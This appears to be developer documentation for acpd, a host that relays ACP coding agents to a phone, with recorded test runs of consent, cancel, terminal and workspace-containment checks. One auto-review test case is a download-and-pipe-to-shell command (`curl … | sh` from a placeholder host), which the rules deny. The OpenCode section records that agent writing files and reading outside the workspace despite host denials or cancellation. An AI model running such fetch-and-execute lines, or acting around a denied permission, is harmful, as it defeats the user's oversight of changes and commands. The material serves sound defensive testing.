# Real-agent testing through ACPortal

This note is how to drive a real ACP agent through `acpd` the way the phone does,
and what has already been verified. It is not a claim of production readiness.

## What the check covers

[`scripts/real-agent-check.py`](../scripts/real-agent-check.py) pairs a throwaway
device, creates a session over HTTP and talks ACP over the `acpd.v1` WebSocket.
It drives these steps by default:

1. **inspect** — the agent lists and reads project files.
2. **approve** — a host `fs/write_text_file` consent is allowed; a broken test is fixed on disk.
3. **deny** — a host write consent is refused; the file stays unchanged.
4. **terminal** — the agent is asked to run the project's tests.
5. **reconnect** — the client detaches mid-prompt and reconnects with `?after=`; the host replays the rest.
6. **load** — the host session is deleted and a new one is opened with `loadSessionId`.
7. **cancel** — `session/cancel` is sent while a host write consent is outstanding; the file is not written.
8. **outside** — a path outside the workspace is refused by the host.

[`scripts/acp-stdio-tap.py`](../scripts/acp-stdio-tap.py) is optional. Put it in
front of the agent command when you need to see the raw ACP frames between host
and agent. The tap writes full payloads to `TAP_FILE` (prompts, file contents,
command lines). Keep that file local and delete it; never commit it.

## Setup used for the recorded Linux run

| Piece | Value |
| --- | --- |
| Date | 8 October 2026 (Europe/Athens) |
| Host | `acpd` on branch `host-logging-doctor-android-ci` |
| Agent | Goose 1.53.0 CLI at `/usr/lib/goose/resources/bin/goose acp` (bundled with the desktop package; the `goose` on PATH is the GUI and must not be used for ACP) |
| Model | DeepSeek `deepseek-flash` through Goose's OpenAI-compatible provider (`GOOSE_PROVIDER=openai`, `GOOSE_MODEL=deepseek-flash`, `OPENAI_HOST=https://api.deepseek.com`) |
| Credentials | Operator environment only (`OPENAI_API_KEY`). Nothing was written into Goose's own config or into the registry. |
| Mode | `GOOSE_MODE=approve` so every tool and host consent reaches the client |
| Fixture | Tiny Python calculator under an allowed workspace root: `calc.py` (buggy `add`), `test_calc.py`, `README.md` |

A private config and registry (kept outside the repo) look like this. Adjust absolute
paths. Do not put provider keys in the registry.

```toml
registry = "agents.json"
workspace_roots = ["project"]
state_directory = "state"

[server]
listen = "127.0.0.1:8799"

[runtime]
request_timeout_seconds = 180

[logging]
file = "logs/acpd.log"
frame_metadata = true
```

```json
[
  {
    "id": "goose",
    "name": "Goose",
    "command": "/usr/lib/goose/resources/bin/goose",
    "args": ["acp"],
    "transport": "stdio",
    "enabled": true,
    "env": {
      "GOOSE_MODE": "approve",
      "GOOSE_PROVIDER": "openai",
      "GOOSE_MODEL": "deepseek-flash",
      "OPENAI_HOST": "https://api.deepseek.com"
    }
  },
  {
    "id": "gemini",
    "name": "Gemini CLI",
    "command": "gemini",
    "args": ["--acp"],
    "enabled": false
  }
]
```

The built-in Gemini entry must be disabled (or present) for `doctor` and `start`
to succeed: an enabled but missing built-in fails the executable check.

## How to reproduce

1. Build the host: `cargo build --locked -p acpd`.
2. Create an empty root under an allowed workspace and write the fixture:

   ```bash
   python3 scripts/real-agent-check.py --init-fixture /abs/path/to/root/calc
   ```

3. Put `config.toml` and `agents.json` next to that root (see above). Create the
   log directory (`mkdir -p logs`); the host never creates it.
4. Install the WebSocket client used by the script:

   ```bash
   python3 -m venv .venv && .venv/bin/pip install websockets==15.0.1
   ```

5. Export the provider key into the environment of the check (never into the registry):

   ```bash
   export OPENAI_API_KEY="$(cat /path/to/key-file)"
   ```

6. Run the check. Pairing codes and bearer tokens stay in memory and are never printed.

   ```bash
   .venv/bin/python scripts/real-agent-check.py \
     --acpd target/debug/acpd \
     --config /abs/path/to/config.toml \
     --agent goose \
     --workspace /abs/path/to/root/calc \
     --capture /tmp/acp-capture.jsonl \
     --results /tmp/acp-results.json \
     --host-output /tmp/acpd-host.out
   ```

7. Optional: wrap the agent with `scripts/acp-stdio-tap.py` (see its docstring) when
   you need raw frames. Delete `TAP_FILE` afterwards.

Useful flags: `--steps inspect,approve` to run a subset; `--steps elicitation` (opt-in) opens a second session with form elicitation and the MCP fixture `scripts/mcp-elicitation-fixture.py`; `--steps autoreview`
(not in the default list) exercises shell-line auto-review and needs
`[shell_review.<agent>] rules = true` in the host config; `--outside-file` for a
harmless path outside the workspace (default `/etc/hostname`).

## Results (8 October 2026, Linux)

One continuous run through all eight steps (the script now has nine; `kill` was added later), with the host on the branch tip that
includes the callback error-code fix. Usage numbers are the per-prompt totals
Goose reported on each response (they accumulate context, so later steps look
larger); Goose's own session record for this run shows about 2.9k output tokens
and about 109k accumulated total tokens. Rough DeepSeek cost for that session was
about \$0.0025; the day's earlier exploratory runs brought the fixture's total to
about \$0.014.

| Step | Result | Evidence |
| --- | --- | --- |
| 1. Tool use (inspect) | **pass** | Goose listed the tree and read `README.md`, `calc.py` and `test_calc.py` through agent permissions plus host `fs/read_text_file`. It correctly reported that `add` subtracts and that `test_add` should fail. |
| 2. Permission approve | **pass** | Agent `edit` was allowed, then host `Write calc.py` (`_meta.acpdSource: host-filesystem`, option `acpd-write-allow`). On disk: tests went from `FAILED (failures=1)` to `OK`; `git` showed only `calc.py` modified. |
| 3. Permission deny | **pass** | Host `Write README.md` was answered with `acpd-write-deny` (twice when Goose retried via `write`). README stayed unchanged; Goose reported the host refusal and stopped retrying after the second denial. |
| 4. Terminal | **partial (superseded below)** | At the time the host only accepted a resolved executable with literal args, so Goose's shell strings (`cd … && python3 -m unittest -v`, no `args`) were refused with `-32602`; plain argv (`pwd`, `ls`) ran through `host-terminal`. Shell lines are now supported after per-line approval; see *Shell-line terminals* below. |
| 5. Reconnect | **pass** | Client detached after the first message chunk, then reconnected with `?after=`. Replay reported `gap: false` and delivered the remaining chunks plus the final `end_turn` response. |
| 6. Session load | **pass** | After deleting the host session, `POST /v1/sessions` with `loadSessionId` returned `ready` with the same ACP session id. The new attachment replayed prior user/agent/tool history; a follow-up prompt answered `calc.py` as the file changed earlier. |
| 7. Cancel mid write | **pass** | While a host `Write CANCEL_MARKER.txt` consent was outstanding, the client sent `session/cancel` and answered the consent with `cancelled`. Prompt `stopReason` was `cancelled`; `CANCEL_MARKER.txt` was never created. The host answered the agent's pending `fs/write_text_file` with `-32800`. |
| 8. Outside-workspace read | **pass** | Goose requested `/etc/hostname`; host `fs/read_text_file` returned `-32602` with `Workspace text read denied or unavailable`. Goose reported the denial and printed no contents. |
| Cleanup | **pass** | After `DELETE /v1/sessions/:id` and host shutdown, no `goose acp` process remained under the host. |
| Frame metadata log | **pass** | With `frame_metadata = true` the 0600 log held only `direction`/`kind`/`method`/`update`/`bytes` (and `code` on errors). No prompt text, reply text, path, pairing code, bearer token or provider key. |

Doctor against the same Goose install, run separately earlier the same day, reported
`ready` (exit 0) once Gemini was disabled. See also the sign-in / frame-metadata
checkpoint in `AGENTS.md`.

## Shell-line terminals (8 October 2026, Linux, 16:55 Athens)

After shell-line support landed (consent `_meta.acpdSource: host-shell-command`,
options `acpd-shell-deny` / `acpd-shell-allow`), the script was extended: the
`terminal` step approves shell-line consents with `acpd-shell-allow` and records
the exact line shown plus the host terminal snapshots, and a new `kill` step
approves `sleep 45 && echo finished-after-sleep`, waits until the host reports
the terminal running, then sends `session/cancel`.

Command: `real-agent-check.py --steps approve,terminal,kill` on a fresh fixture
(Goose 1.53.0, `deepseek-flash`, env-only key).

| Step | Result | Evidence |
| --- | --- | --- |
| approve | **pass** | Host `Write calc.py` approved; tests went `FAILED (failures=1)` → `OK`. |
| terminal | **pass** | Goose asked its own `shell · python3 -m unittest -v` permission, then the host showed `Run shell command` with `shellLine: "python3 -m unittest -v"`, `shell: "/bin/sh -c"`, cwd = the fixture and `environmentNames: ["AGENT_SESSION_ID"]` (no values). After approval the terminal snapshot ended with `Ran 2 tests in 0.000s` / `OK` and `exitStatus: {exitCode: 0}`; Goose answered "2 tests passed … exit code 0". |
| kill | **pass** | Approved line `sleep 45 && echo finished-after-sleep`. Before cancel the host had `/bin/sh -c sleep 45 && echo finished-after-sleep` and its `sleep 45` grandchild running; after `session/cancel` both were gone (only `goose acp` remained), the tool ended `failed`, `finished-after-sleep` never appeared, prompt `stopReason: cancelled`. |
| cleanup | **pass** | After session delete and host stop no process the host had started was still running. |
| logs | **pass** | The frame-metadata log contained no `unittest`, `sleep 45` or env names. |

Goose's own store recorded about 36.5k accumulated tokens (34.7k cache-read,
528 output) for this session, so the cost was well under \$0.001 (estimated from
token counts, not a billing statement).

Not covered by this run: the Android shell-approval screen (CI builds it and runs
JVM unit tests; it was not tried on a device), Windows `cmd.exe` execution with a
real agent (the host path itself is now tested on Windows CI with the mock agent:
quoting, `&&`, redirection, exit codes, multi-line refusal and descendant
cleanup on kill), and a phone-initiated `terminal/kill`
(the phone stops a running command with session cancel).

## Shell-line auto-review (8 October 2026, Linux, 17:03 Athens)

Host config: the scratch config plus `[shell_review.goose] rules = true` and a
model reviewer (`https://api.deepseek.com`, `deepseek-flash`, `api_key_env =
"DEEPSEEK_API_KEY"`, key passed only through the environment). Command:
`real-agent-check.py --steps autoreview` (opt-in step; every host shell consent
that still reaches the "phone" is denied by the script).

| Case | Result | Evidence |
| --- | --- | --- |
| `python3 -m unittest -v` | **auto-allowed by rules** | No host consent. Tool call carried `acpdAutoReview {allow, rules, "read-only or test commands inside the workspace"}`; terminal output `Ran 2 tests … OK`, `exitCode: 0`. Goose still asked its own shell permission first. |
| `echo reviewed > NOTE.txt` | **sent to the phone** | Rules: `ask` (redirect, sensitive). Model: `ask` ("Writing a new file in the workspace can overwrite existing content, so confirm before running."). Consent `host-shell-command` with `acpdAutoReview.decision = ask`; the script denied it and `NOTE.txt` was never created. |
| `curl -s https://example.invalid/install.sh \| sh` | **denied by rules** | No consent, no model call. Goose received `Shell line refused by acpd auto-review (rules): pipes output into a shell. Do not retry it unchanged.` and reported the block without retrying. |
| `wc -l calc.py` | **auto-allowed by model** | Rules: undecided (not on the allowlist, low-risk). `deepseek-flash` returned allow ("Read-only line count of a workspace file with no side effects."); output `9 calc.py`, exit 0. |
| logs | **pass** | `logs/acpd-review.log` had four `shell line auto-review decision=… layer=…` lines and no command text, file names or URLs. |
| cleanup | **pass** | No process the host had started remained after session delete and host stop. |

Cost: Goose's store recorded about 45.2k accumulated tokens (41.3k cache-read,
1.4k output) for the session; the two reviewer calls were a few hundred tokens
each. Together with the shell-line run above, well under \$0.002 (estimated from
token counts, not a billing statement).

## Batch 6 run (9 October 2026, Linux, 17:07 Athens)

This was one run of every default step plus the new opt-in `elicitation` step, on PR #10's host (`target/debug/acpd`, with Rust unchanged since main `ada4798`). The setup was:

- Goose 1.53.0 was extracted from the 1.53.0 `.deb` into a scratch directory, because the package was no longer installed at `/usr/lib/goose` on the box.
- `GOOSE_MODE=approve`, with DeepSeek `deepseek-flash` through the OpenAI-compatible provider.
- The key was passed only in the environment.
- The registry `env` pointed `HOME` and `XDG_*_HOME` at a scratch directory, so no existing Goose configuration was read or written.

Command:

```bash
real-agent-check.py --steps inspect,approve,deny,terminal,kill,reconnect,load,cancel,outside,elicitation
```

| Step | Result | Evidence |
| --- | --- | --- |
| inspect | **pass** | Agent permissions for `tree` and `read` came first. Goose then also tried to run the tests: an agent `shell` permission, then a host `host-shell-command` consent. The tests failed as expected, because the bug was not fixed yet. |
| approve | **pass** | Agent `edit`, then host `Write calc.py` approved. Tests went from `FAILED (failures=1)` to `OK`. |
| deny | **pass** | Host `Write README.md` was answered with `acpd-write-deny`. README was unchanged, and Goose reported that the host refused the write. |
| terminal | **pass** | Approved line `cd … && python3 -m unittest -v 2>&1`, run with `/bin/sh -c`, with only the variable name `AGENT_SESSION_ID` shown. Exit code 0, `Ran 2 tests … OK`. |
| kill | **pass** | `/bin/sh -c sleep 45 && echo finished-after-sleep` and its `sleep 45` were running. After `session/cancel` both were gone, `stopReason: cancelled`, and nothing was printed. |
| reconnect | **pass** | Reconnected with `?after=1435`. The replay had `gap: false` and 131 events, including the final response. |
| load | **pass** | Deleted the session, then opened it again with `loadSessionId`: same ACP id, and 36 history events replayed. The follow-up prompt answered `calc.py`. |
| cancel | **pass** | Host write consent held, then `session/cancel` sent. `stopReason: cancelled` and `CANCEL_MARKER.txt` was never created. |
| outside | **pass** | Reading `/etc/hostname` was refused with "Workspace text read denied or unavailable". |
| elicitation (accept) | **pass** | See below. |
| elicitation (decline) | **pass** | See below. |
| cleanup and logs | **pass** | No process the host had started remained. The frame-metadata log (0600) contained none of the prompt words, form values, shell lines or the bearer token, and none of the output files contained the key. |

### How the elicitation step works

This step opens a second session the way the phone does. The session opts in with `workspaceAccess.formElicitation: true` and has one stdio MCP server, [`scripts/mcp-elicitation-fixture.py`](../scripts/mcp-elicitation-fixture.py). Its only tool, `ask_preference`, asks the MCP client (Goose) to fill in a form with a colour choice and a count.

Results:

- Goose advertised `elicitation` to the MCP server.
- After the agent permission for the tool, Goose sent the client an ACP `elicitation/create` with `mode: form`, the server's message, fields `colour` and `count`, and `sessionId` scope. The host accepted it and forwarded it.
- The script's answer `{"action":"accept","content":{"colour":"green","count":2}}` reached the MCP server unchanged, and Goose told the model "green, count 2".
- A second prompt answered with `{"action":"decline"}`. That also reached the server, and Goose reported that the user declined.

So Goose does send elicitation through ACP, but only when an MCP server asks for it. Goose does not ask for it by itself. The [testy suite](testy.md) remains the proof for malformed requests, and for the case where the phone does not opt in.

Not covered: the Android elicitation sheet with a real agent (it was not run on a device or emulator in this batch).

### Cost

Goose's session store (in the scratch directory) recorded about 126k accumulated tokens over the two sessions: 114.6k cache-read and 3.4k output. Based on those token counts and the earlier runs, the cost was about $0.003. This is an estimate, not a billing statement. No host bug was found.

## Bugs found and fixed

| Issue | Status |
| --- | --- |
| Host answered refused `fs/read_text_file` / `fs/write_text_file` (and some other host failures) with JSON-RPC `-32000`. ACP reserves that code for `auth_required`, so Goose told the model "Authentication required" for a path outside the workspace. | Fixed on this branch: refusals use `-32602`, not-ready/capacity use `-32603`, cancel of a pending callback uses `-32800`. Client-facing "Agent request failed" keeps the agent's own code. Tests cover an outside read, a denied write and an agent error forwarded over the WebSocket. |

## Known limitations (not host bugs)

- **Goose shell strings.** Goose's shell tool often puts a whole shell line in
  `terminal/create.command` instead of a resolved executable plus `args`. The host
  now shows such lines as a `host-shell-command` consent and runs them through
  `/bin/sh -c` only after per-line approval. Goose also asks its own shell
  permission first, so each command needs two approvals in `approve` mode.
- **Doctor sign-in alone cannot see bad provider credentials for Goose.** Goose
  creates sessions without talking to the provider, so `doctor --agent` reports
  `ready` even with an unconfigured provider. Use `doctor --agent goose
  --workspace <dir> --prompt-check` (one small model request). On 8 October 2026
  it printed `provider responded (stopReason end_turn)` with a working DeepSeek
  key and failed with `auth_required (-32000)` when `OPENAI_API_KEY` was an
  invalid dummy value (an unconfigured provider earlier failed with `-32603`).
  Unsetting the variable did not fail, because this Goose install also had a key
  in its own stored configuration.
- **Empty Goose sessions.** Each doctor or short-lived session leaves a row in
  Goose's own session store.
- **Android phone UI.** This check drives the host API only. Instrumenting the
  Android client against a real agent remains open.
- **Broader Goose workflow.** Diff review UX, competing controllers, process death
  and physical-device TLS are not covered here.

## Cleanup

- The script stops the host and revokes the throwaway device. Confirm with
  `pgrep -af 'goose acp'` (only the desktop app's own `goose serve`, if any,
  should remain) and by reading the host log for `session created` / listening lines.
- Delete capture JSONL, results JSON, host logs and any `TAP_FILE`.
- Reset the fixture with `--init-fixture` or `git checkout -- .` inside it.
- Optional: remove leftover Goose sessions for the fixture workspace from
  Goose's own UI or session store. Do not delete unrelated sessions.

## Doctor against other ACP adapters (8 October 2026, Linux, about 22:57 Athens)

`acpd doctor --agent <id> --workspace <dir> [--prompt-check]` was run against custom registry entries for three agents besides Goose, each with its state redirected into a scratch directory through the registry `env` (`HOME` or `XDG_*_HOME`), so no existing configuration was read or changed. Commands were absolute paths, as the registry requires.

| Agent and entry | Doctor (no prompt) | `--prompt-check` |
| --- | --- | --- |
| testy (rust-sdk v3.2.0), native binary, no args | `ready`, exit 0 | `provider responded (stopReason end_turn)`, exit 0 |
| OpenCode 1.18.35 (`npm install opencode-ai`), native `opencode` binary, `["acp"]`, no provider configured | `ready`, exit 0 | `provider responded (stopReason end_turn)`, exit 0. OpenCode picked its own free hosted model (`opencode/big-pickle`; its session store recorded cost 0) |
| OpenCode 1.18.35, same, with `OPENCODE_CONFIG_CONTENT={"model":"deepseek/deepseek-flash"}` and an invalid dummy `DEEPSEEK_API_KEY` | `ready`, exit 0 | failed with JSON-RPC `-32603` (OpenCode logged an authentication error), exit 1; no agent text printed |
| Gemini CLI 0.63.0 (`npm install @google/gemini-cli`), `/usr/bin/node` + `bundle/gemini.js`, `["--acp"]`, no credentials | `sign-in required`, listing `oauth-personal`, `gemini-api-key`, `vertex-ai`, `gateway`, exit 1 | same; no prompt sent because `session/new` already required sign-in |

What this shows: doctor negotiates with third-party adapters configured as custom registry entries, reports the real `sign-in required` path (Gemini) and, with the opt-in prompt, catches a rejected provider key that `session/new` does not reveal (OpenCode, like Goose). OpenCode reports a rejected key as `-32603`, not ACP `auth_required` (`-32000`), with an "Authentication Fails, Your api key ..." message. Doctor now notes when an agent's (unprinted) error text mentions authentication or an API key. For this OpenCode case it says the provider credentials are probably missing or were rejected (rechecked on the real agent). Other `-32603` errors keep the generic credentials/model/provider message. The built-in Gemini entry's `--acp` flag is current (`--experimental-acp` is deprecated in 0.63.0). Templates for both are in `examples/agents.custom.json` (disabled). No session, file, terminal or permission flow was tried with OpenCode or Gemini. Cost: none billed (OpenCode's free model; the invalid DeepSeek key was rejected before any model ran). The testy part is automated in `tests/testy.rs`.

## OpenCode session workflow (8 October 2026, Linux, about 23:15 Athens)

OpenCode 1.18.35 (`opencode acp`, native binary from `npm install opencode-ai`) was driven through `acpd start`, pairing and the `acpd.v1` WebSocket with `scripts/real-agent-check.py --agent opencode` on the calc fixture (a git repository, so changes were visible). The registry `env` pointed all four `XDG_*_HOME` directories at a scratch directory. No provider was configured, so OpenCode used its own free hosted model `opencode/big-pickle`: 43 model turns, about 346k accumulated tokens, cost 0 in OpenCode's session store.

**Default OpenCode configuration** (first run, inspect/approve/deny): no permission request of any kind and no ACP callback. OpenCode ran `ls -la`, read the files and edited `calc.py` and `README.md` with its own tools; the frame log shows only `session/prompt` and `session/update`. The "deny" step could not deny anything, and README changed.

**With `"permission": {"edit": "ask", "bash": "ask", "webfetch": "ask", "external_directory": "ask"}`** in OpenCode's own `opencode.json` (later runs):

| Step | Result |
| --- | --- |
| inspect | One agent permission (`ls -la`, allowed once), file reads with OpenCode's own `read`, correct summary (`add` is `a - b`, tests fail). |
| approve | Agent permission for the `calc.py` edit, then a host `Write calc.py` consent with the diff; allowed. Tests went from FAILED to OK. |
| deny | Agent permission allowed, host `Write README.md` consent denied, but **README changed anyway**. OpenCode writes the file with its own tool at about the same time as it calls `fs/write_text_file` (in one run the file's mtime was 40 ms before the host consent was published). With this branch's change the failed host tool call is marked `_meta.acpdWrite: "changed-without-consent"` with a notice (seen in the real run). |
| denyagent (new optional step) | OpenCode's own edit permission rejected: README unchanged, tool call `failed`. **The agent's own permission is the effective gate for OpenCode.** |
| terminal | OpenCode does not use ACP terminals: `python3 -m unittest -v` ran in OpenCode's own `bash` tool after an agent permission (`kind: execute`); "2 tests passed". No host terminal consent or `acpdTerminal` output. |
| kill | After the agent permission for `sleep 45 && echo finished-after-sleep`, `session/cancel` while it ran: `stopReason: cancelled`; the `bash -c` and `sleep 45` children under `opencode acp` were gone afterwards and `finished-after-sleep` never appeared. The script now also cancels agent-run shell commands (it previously waited only for host terminal output, so the first run let the sleep finish). |
| reconnect | Detached after the first chunk; `?after=158` replayed 13 events (11 message chunks, usage, response) with no gap or duplicates. |
| load | After `DELETE`, `loadSessionId` restored the session (same ACP id; 47 history events replayed). The follow-up answered "calc.py and README.md". |
| cancel | Agent permission allowed, host write consent held, `session/cancel`: `stopReason: cancelled`, but `CANCEL_MARKER.txt` **existed**, again written by OpenCode itself; the cancelled host write was marked `changed-without-consent`. |
| outside | OpenCode asked for `external_directory` `/etc` (allowed once by the script) and read `/etc/hostname` with its own tool; the host's workspace containment does not apply to agent-side tools. |

Session delete and host shutdown left no OpenCode process. The frame-metadata log held no prompt or file text.

Conclusions: OpenCode works through acpd for prompts, streaming, agent permissions, cancel, reconnect and load. Its file edits, shell commands and reads use its own tools, so the host's write/terminal consents and workspace containment do not control it. Configure OpenCode's permissions to `ask` and treat its own permission prompts as the real decision. Host aids added on this branch: a refused or cancelled host write that turns out to be already applied is flagged, and a write of text the file already holds is answered without a consent (mock-tested; not observed with OpenCode, whose write races the callback). See [security](security.md). Not tested: OpenCode's `allow_always`/`reject_always`, MCP and a paid provider.

### OpenCode "Always allow" (8 October 2026, about 23:50 Athens)

The optional `always` step of `scripts/real-agent-check.py` was run against OpenCode 1.18.35 with `permission: ask`, on the free model `opencode/big-pickle` (cost 0), in a git fixture. It sends four prompts. Host write consents are allowed once; agent permissions get the kind named below.

| Substep | Answer | Result |
| --- | --- | --- |
| allow_first | `allow_always` for `git log --oneline -1` (`bash`) | Ran. |
| allow_again | (would have chosen `reject_once`) | Same command ran again with **no permission request**. |
| edit_first | `allow_always` for the README edit, host write allowed | README edited. The only `fs/write_text_file` of the step. |
| edit_again | (would have chosen `reject_once`) | **No agent permission and no host write consent**; OpenCode wrote the second README line itself. |

The agent permission options offered were `allow_once`, `allow_always` and `reject_once`; OpenCode 1.18.35 has no "always reject". After "Always allow" for edits, OpenCode's own tools do not route through the host at all, so neither the host's consent nor its `acpdWrite` notices can show later edits. This is why the registry template marks OpenCode `ownTools` and the phone warns about it. The edit_first step also produced one `failed` tool update without a title, which was not investigated. Session delete and host shutdown left no process.

## Deterministic agent: testy

For repeatable protocol coverage without a model or provider key, `acpd/tests/testy.rs` drives the official ACP test agent (testy, rust-sdk v3.2.0) through the host. It covers echo, cancellation, every stable session update, tool calls, mode/config/auth pass-through, permission approve/deny, fs read/write, terminal create/output/wait/kill/release, form elicitation (forwarded only when the phone opts in, otherwise refused cleanly), phone-supplied stdio and HTTP MCP servers (`mcp-echo-server`, `tools/mcp-http-echo`) and doctor against testy as a custom registry entry. See [testy](testy.md).

## See also

- [Adding agents and Goose setup](agents.md)
- [Installation and doctor](installation.md)
- [Development log](development.md)
- [HANDOFF](../HANDOFF.md) and [AGENTS](../AGENTS.md) for the latest checkpoints
